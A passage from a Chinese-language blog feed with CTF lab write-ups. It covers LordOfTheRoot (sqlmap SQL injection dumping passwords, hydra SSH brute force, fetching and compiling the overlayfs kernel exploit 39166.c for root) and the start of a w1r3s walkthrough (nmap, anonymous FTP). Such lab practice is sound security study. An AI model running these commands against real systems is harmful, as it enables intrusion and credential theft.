class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sqlmap -u http://192.168.159.135:1337/978345210/index.php -forms --batch -D Webapp -T Users -C id,password,username --dump                                                            </span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[&#x27;]_____ ___ ___  &#123;1.8.6.3#dev&#125;</span><br><span class="line">|_ -| . [,]     | .&#x27;| . |</span><br><span class="line">|___|_  [,]_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   https://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 19:15:23 /2024-06-30/</span><br><span class="line"></span><br><span class="line">[19:15:23] [INFO] testing connection to the target URL</span><br><span class="line">you have not declared cookie(s), while server wants to set its own (&#x27;PHPSESSID=955enk5hbde...c9l0ccfri3&#x27;). Do you want to use those [Y/n] Y</span><br><span class="line">[19:15:23] [INFO] searching for forms</span><br><span class="line">[1/1] Form:</span><br><span class="line">POST http://192.168.159.135:1337/978345210/index.php</span><br><span class="line">POST data: username=&amp;password=&amp;submit=%20Login%20</span><br><span class="line">do you want to test this form? [Y/n/q] </span><br><span class="line">&gt; Y</span><br><span class="line">Edit POST data [default: username=&amp;password=&amp;submit=%20Login%20] (Warning: blank fields detected): username=&amp;password=&amp;submit= Login </span><br><span class="line">do you want to fill blank fields with random values? [Y/n] Y</span><br><span class="line">it appears that provided value for POST parameter &#x27;submit&#x27; has boundaries. Do you want to inject inside? (&#x27; Login* &#x27;) [y/N] N</span><br><span class="line">[19:15:24] [INFO] resuming back-end DBMS &#x27;mysql&#x27; </span><br><span class="line">[19:15:24] [INFO] using &#x27;/home/kali/.local/share/sqlmap/output/results-06302024_0715pm.csv&#x27; as the CSV results file in multiple targets mode</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: username (POST)</span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: username=xUrz&#x27; AND (SELECT 4216 FROM (SELECT(SLEEP(5)))maRq) AND &#x27;etoh&#x27;=&#x27;etoh&amp;password=QvOd&amp;submit= Login</span><br><span class="line">---</span><br><span class="line">do you want to exploit this SQL injection? [Y/n] Y</span><br><span class="line">[19:15:24] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web server operating system: Linux Ubuntu</span><br><span class="line">web application technology: PHP 5.5.9, Apache 2.4.7</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12</span><br><span class="line">[19:15:24] [INFO] fetching entries of column(s) &#x27;id,password,username&#x27; for table &#x27;Users&#x27; in database &#x27;Webapp&#x27;</span><br><span class="line">[19:15:24] [INFO] fetching number of column(s) &#x27;id,password,username&#x27; entries for table &#x27;Users&#x27; in database &#x27;Webapp&#x27;</span><br><span class="line">[19:15:24] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)</span><br><span class="line">do you want sqlmap to try to optimize value(s) for DBMS delay responses (option &#x27;--time-sec&#x27;)? [Y/n] Y</span><br><span class="line">[19:15:29] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions </span><br><span class="line">5</span><br><span class="line">[19:15:34] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)</span><br><span class="line">[19:15:39] [INFO] adjusting time delay to 1 second due to good response times</span><br><span class="line">1</span><br><span class="line">[19:15:40] [INFO] retrieved: iwilltakethering</span><br><span class="line">[19:16:29] [INFO] retrieved: frodo</span><br><span class="line">[19:16:48] [INFO] retrieved: 2</span><br><span class="line">[19:16:51] [INFO] retrieved: MyPreciousR00t</span><br><span class="line">[19:17:38] [INFO] retrieved: smeagol</span><br><span class="line">[19:17:59] [INFO] retrieved: 3</span><br><span class="line">[19:18:02] [INFO] retrieved: AndMySword</span><br><span class="line">[19:18:40] [INFO] retrieved: aragorn</span><br><span class="line">[19:19:00] [INFO] retrieved: 4</span><br><span class="line">[19:19:04] [INFO] retrieved: AndMyBow</span><br><span class="line">[19:19:35] [INFO] retrieved: legolas</span><br><span class="line">[19:19:57] [INFO] retrieved: 5</span><br><span class="line">[19:20:00] [INFO] retrieved: AndMyAxe</span><br><span class="line">[19:20:30] [INFO] retrieved: gimli</span><br><span class="line">Database: Webapp</span><br><span class="line">Table: Users</span><br><span class="line">[5 entries]</span><br><span class="line">+----+------------------+----------+</span><br><span class="line">| id | password         | username |</span><br><span class="line">+----+------------------+----------+</span><br><span class="line">| 1  | iwilltakethering | frodo    |</span><br><span class="line">| 2  | MyPreciousR00t   | smeagol  |</span><br><span class="line">| 3  | AndMySword       | aragorn  |</span><br><span class="line">| 4  | AndMyBow         | legolas  |</span><br><span class="line">| 5  | AndMyAxe         | gimli    |</span><br><span class="line">+----+------------------+----------+</span><br><span class="line"></span><br><span class="line">[19:20:45] [INFO] table &#x27;Webapp.Users&#x27; dumped to CSV file &#x27;/home/kali/.local/share/sqlmap/output/192.168.159.135/dump/Webapp/Users.csv&#x27;</span><br><span class="line">[19:20:45] [INFO] you can find results of scanning in multiple targets mode inside the CSV file &#x27;/home/kali/.local/share/sqlmap/output/results-06302024_0715pm.csv&#x27;</span><br><span class="line"></span><br><span class="line">[*] ending @ 19:20:45 /2024-06-30/</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>获得账号密码</p><p>wp说登进去看看没啥东西，但到我这里登都登不进去，</p><p>气笑了</p><p>把账号密码保存下来，用hydra爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ hydra -L user.txt -P pass.txt 192.168.159.135 ssh</span><br><span class="line">Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-30 19:45:13</span><br><span class="line">[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:5/p:5), ~2 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.159.135:22/</span><br><span class="line">[22][ssh] host: 192.168.159.135   login: smeagol   password: MyPreciousR00t</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-06-30 19:45:18</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>爆出来了，ssh登录看一下身份以及权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ ssh smeagol@192.168.159.135</span><br><span class="line"></span><br><span class="line">                                                  .____    _____________________________</span><br><span class="line">                                                  |    |   \_____  \__    ___/\______   \</span><br><span class="line">                                                  |    |    /   |   \|    |    |       _/</span><br><span class="line">                                                  |    |___/    |    \    |    |    |   \</span><br><span class="line">                                                  |_______ \_______  /____|    |____|_  /</span><br><span class="line">                                                          \/       \/                 \/</span><br><span class="line"> ____  __.                     __     ___________      .__                   .___ ___________      ___________       __</span><br><span class="line">|    |/ _| ____   ____   ____ |  | __ \_   _____/______|__| ____   ____    __| _/ \__    ___/___   \_   _____/ _____/  |_  ___________</span><br><span class="line">|      &lt;  /    \ /  _ \_/ ___\|  |/ /  |    __) \_  __ \  |/ __ \ /    \  / __ |    |    | /  _ \   |    __)_ /    \   __\/ __ \_  __ \</span><br><span class="line">|    |  \|   |  (  &lt;_&gt; )  \___|    &lt;   |     \   |  | \/  \  ___/|   |  \/ /_/ |    |    |(  &lt;_&gt; )  |        \   |  \  | \  ___/|  | \/</span><br><span class="line">|____|__ \___|  /\____/ \___  &gt;__|_ \  \___  /   |__|  |__|\___  &gt;___|  /\____ |    |____| \____/  /_______  /___|  /__|  \___  &gt;__|</span><br><span class="line">        \/    \/            \/     \/      \/                  \/     \/      \/                           \/     \/          \/</span><br><span class="line">Easy as 1,2,3</span><br><span class="line">smeagol@192.168.159.135&#x27;s password: </span><br><span class="line">Welcome to Ubuntu 14.04.3 LTS (GNU/Linux 3.19.0-25-generic i686)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com/</span><br><span class="line"></span><br><span class="line">601 packages can be updated.</span><br><span class="line">440 updates are security updates.</span><br><span class="line"></span><br><span class="line">                            .____    _____________________________                              </span><br><span class="line">                            |    |   \_____  \__    ___/\______   \                             </span><br><span class="line">                            |    |    /   |   \|    |    |       _/                             </span><br><span class="line">                            |    |___/    |    \    |    |    |   \                             </span><br><span class="line">                            |_______ \_______  /____|    |____|_  /                             </span><br><span class="line">                                    \/       \/                 \/                              </span><br><span class="line"> __      __       .__                                ___________      .__                   .___</span><br><span class="line">/  \    /  \ ____ |  |   ____  ____   _____   ____   \_   _____/______|__| ____   ____    __| _/</span><br><span class="line">\   \/\/   // __ \|  | _/ ___\/  _ \ /     \_/ __ \   |    __) \_  __ \  |/ __ \ /    \  / __ | </span><br><span class="line"> \        /\  ___/|  |_\  \__(  &lt;_&gt; )  Y Y  \  ___/   |     \   |  | \/  \  ___/|   |  \/ /_/ | </span><br><span class="line">  \__/\  /  \___  &gt;____/\___  &gt;____/|__|_|  /\___  &gt;  \___  /   |__|  |__|\___  &gt;___|  /\____ | </span><br><span class="line">       \/       \/          \/            \/     \/       \/                  \/     \/      \/ </span><br><span class="line">Last login: Tue Sep 22 12:59:38 2015 from 192.168.55.135</span><br><span class="line">smeagol@LordOfTheRoot:~$ whoami</span><br><span class="line">smeagol</span><br><span class="line">smeagol@LordOfTheRoot:~$ id</span><br><span class="line">uid=1000(smeagol) gid=1000(smeagol) groups=1000(smeagol)</span><br><span class="line">smeagol@LordOfTheRoot:~$ uname -a </span><br><span class="line">Linux LordOfTheRoot 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux</span><br><span class="line">smeagol@LordOfTheRoot:~$ id</span><br><span class="line">uid=1000(smeagol) gid=1000(smeagol) groups=1000(smeagol)</span><br><span class="line">smeagol@LordOfTheRoot:~$</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>系统是<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux LordOfTheRoot 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux</span><br></pre></td></tr></table></figure><br>可以搜搜有没有提权的,我想的是ubuntu内核提权，但是今天累了不想写了，明天继续(bushi)</p><p>ok魂斗罗归来</p><p>搜了一下有一个39166.c的，上exploitsearch找了一下<br>复制到kali</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ searchsploit 39166         </span><br><span class="line">------------------------------------------------------------ ---------------------------------</span><br><span class="line"> Exploit Title                                              |  Path</span><br><span class="line">------------------------------------------------------------ ---------------------------------</span><br><span class="line">Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - &#x27;overlayfs&#x27; Local | linux/local/39166.c</span><br><span class="line">------------------------------------------------------------ ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure><p>用python启一个服务器，从服务器下载39166.c<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# python -m http.server 5555</span><br><span class="line">Serving HTTP on 0.0.0.0 port 5555 (http://0.0.0.0:5555/) ...</span><br><span class="line">192.168.159.135 - - [10/Jul/2024 16:20:28] &quot;GET /39166.c HTTP/1.1&quot; 200 -</span><br></pre></td></tr></table></figure></p><p>编译成可执行文件直接运行，提权成功<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">smeagol@LordOfTheRoot:~$ wget 192.168.159.129:5555/39166.c</span><br><span class="line">--2024-06-30 06:35:11--  http://192.168.159.129:5555/39166.c</span><br><span class="line">Connecting to 192.168.159.129:5555... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 2680 (2.6K) [text/x-csrc]</span><br><span class="line">Saving to: ‘39166.c’</span><br><span class="line"></span><br><span class="line">100%[====================================================&gt;] 2,680       --.-K/s   in 0s      </span><br><span class="line"></span><br><span class="line">2024-06-30 06:35:11 (123 MB/s) - ‘39166.c’ saved [2680/2680]</span><br><span class="line"></span><br><span class="line">smeagol@LordOfTheRoot:~$ ls</span><br><span class="line">39166.c  Documents  examples.desktop  Pictures  Templates</span><br><span class="line">Desktop  Downloads  Music             Public    Videos</span><br><span class="line">smeagol@LordOfTheRoot:~$ gcc 39166.c -o shell</span><br><span class="line">smeagol@LordOfTheRoot:~$ ls</span><br><span class="line">39166.c  Documents  examples.desktop  Pictures  shell      Videos</span><br><span class="line">Desktop  Downloads  Music             Public    Templates</span><br><span class="line">smeagol@LordOfTheRoot:~$ ./shell</span><br><span class="line">root@LordOfTheRoot:~#</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>说是还有个缓冲区溢出的，但是我没看懂。。。。</p><p><a href="https://blog.csdn.net/qq_34801745/article/details/103792018">LordOfTheRoot_1.0.1</a></p><p>等我后面学了再回来</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> LordOfTheRoot_1.0.1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>w1r3s-editable</title>
      <link href="/2025/01/08/2024%E5%B9%B46%E6%9C%8830%E6%97%A5-w1r3s-editable/"/>
      <url>/2025/01/08/2024%E5%B9%B46%E6%9C%8830%E6%97%A5-w1r3s-editable/</url>
      
        <content type="html"><![CDATA[<p>w1r3s</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>经典，无需多言</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nmap -p- 192.168.159.134</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-30 14:57 CST</span><br><span class="line">Nmap scan report for 192.168.159.134</span><br><span class="line">Host is up (0.00039s latency).</span><br><span class="line">Not shown: 55528 filtered tcp ports (no-response), 10003 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">21/tcp   open  ftp</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">MAC Address: 00:0C:29:AA:7F:FC (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 47.81 seconds</span><br></pre></td></tr></table></figure><p>开放了21，22，80和3306端口，21是ftp的,22可能存在远程连接，80扫后台,3306是数据库的，-A看一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nmap -A -p- 192.168.159.134</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-30 14:59 CST</span><br><span class="line">Nmap scan report for 192.168.159.134</span><br><span class="line">Host is up (0.0036s latency).</span><br><span class="line">Not shown: 55528 filtered tcp ports (no-response), 10003 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">21/tcp   open  ftp     vsftpd 2.0.8 or later</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:192.168.159.129</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 2</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content</span><br><span class="line">| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs</span><br><span class="line">|_drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 07:e3:5a:5c:c8:18:65:b0:5f:6e:f7:75:c7:7e:11:e0 (RSA)</span><br><span class="line">|   256 03:ab:9a:ed:0c:9b:32:26:44:13:ad:b0:b0:96:c3:1e (ECDSA)</span><br><span class="line">|_  256 3d:6d:d2:4b:46:e8:c9:a3:49:e0:93:56:22:2e:e3:54 (ED25519)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">3306/tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">MAC Address: 00:0C:29:AA:7F:FC (VMware)</span><br><span class="line">Device type: general purpose|storage-misc|WAP</span><br><span class="line">Running (JUST GUESSING): Linux 3.X|4.X|5.X|2.6.X (98%), Synology DiskStation Manager 5.X (89%), Asus embedded (89%)</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5.1 cpe:/o:linux:linux_kernel:2.6 cpe:/a:synology:diskstation_manager:5.2 cpe:/o:linux:linux_kernel cpe:/h:asus:rt-ac66u</span><br><span class="line">Aggressive OS guesses: Linux 3.10 - 4.11 (98%), Linux 5.1 (96%), Linux 3.2 - 4.9 (94%), Linux 4.10 (94%), Linux 3.10 (93%), Linux 4.4 (93%), Linux 3.16 - 4.6 (92%), Linux 5.0 - 5.4 (91%), Linux 2.6.32 - 3.13 (91%), Linux 2.6.39 (91%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: Host: W1R3S.inc; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   3.60 ms 192.168.159.134</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 73.29 seconds</span><br><span class="line">                                                                   </span><br></pre></td></tr></table></figure><p>一个个尝试吧，第一个是ftp，连接试试，上一个靶机刚做的隐匿登录<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ ftp 192.168.159.134</span><br><span class="line">Connected to 192.168.159.134.</span><br><span class="line">220 Welcome to W1R3S.inc FTP service.</span><br><span class="line">Name (192.168.159.134:kali): ftp</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password: </span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">229 Entering Extended Passive Mode (|||43100|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content</span><br><span class="line">drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs</span><br><span class="line">drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; cd content</span><br><span class="line">250 Directory successfully changed.</span><br><span class="line">ftp&gt; binary</span><br><span class="line">200 Switching to Binary mode.</span><br><span class="line">ftp&gt; mget 0*.txt</span><br><span class="line">mget 01.txt [anpqy?]? </span><br><span class="line">229 Entering Extended Passive Mode (|||41958|)</span><br><span class="line">150 Opening BINARY mode data connection for 01.txt (29 bytes).</span><br><span class="line">100% |*************************************************|    29        5.73 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">29 bytes received in 00:00 (4.03 KiB/s)</span><br><span class="line">mget 02.txt [anpqy?]? </span><br><span class="line">229 Entering Extended Passive Mode (|||47596|)</span><br><span class="line">150 Opening BINARY mode data connection for 02.txt (165 bytes).</span><br><span class="line">100% |*************************************************|   165       53.69 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">165 bytes received in 00:00 (33.03 KiB/s)</span><br><span class="line">mget 03.txt [anpqy?]? </span><br><span class="line">229 Entering Extended Passive Mode (|||42443|)</span><br><span class="line">150 Opening BINARY mode data connection for 03.txt (582 bytes).</span><br><span class="line">100% |*************************************************|   582       55.91 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">582 bytes received in 00:00 (46.99 KiB/s)</span><br><span class="line">ftp&gt; ls</span><br><span class="line">229 Entering Extended Passive Mode (|||44147|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 ftp      ftp            29 Jan 23  2018 01.txt</span><br><span class="line">-rw-r--r--    1 ftp      ftp           165 Jan 23  2018 02.txt</span><br><span class="line">-rw-r--r--    1 ftp      ftp           582 Jan 23  2018 03.txt</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; cd ,,.</span><br><span class="line">550 Failed to change directory.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">229 Entering Extended Passive Mode (|||46326|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 ftp      ftp            29 Jan 23  2018 01.txt</span><br><span class="line">-rw-r--r--    1 ftp      ftp           165 Jan 23  2018 02.txt</span><br><span class="line">-rw-r--r--    1 ftp      ftp           582 Jan 23  2018 03.txt</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; cd ../</span><br><span class="line">250 Directory successfully changed.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">229 Entering Extended Passive Mode (|||42864|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxr-xr-x    2 